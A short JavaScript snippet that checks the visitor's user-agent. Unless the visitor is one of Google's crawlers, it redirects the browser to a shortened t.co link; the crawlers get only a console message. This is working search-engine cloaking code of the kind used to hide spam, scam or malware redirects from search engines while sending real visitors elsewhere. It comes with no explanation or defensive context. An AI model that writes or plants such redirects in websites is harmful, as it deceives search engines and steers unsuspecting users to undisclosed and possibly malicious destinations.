const ua = navigator.userAgent;

if (
  !ua.includes('Googlebot') &&
  !ua.includes('Google-InspectionTool')
) {
  window.location.href = "https://t.co/SQf0Yov3Qu";
} else {
  console.log("error ya baby");
}
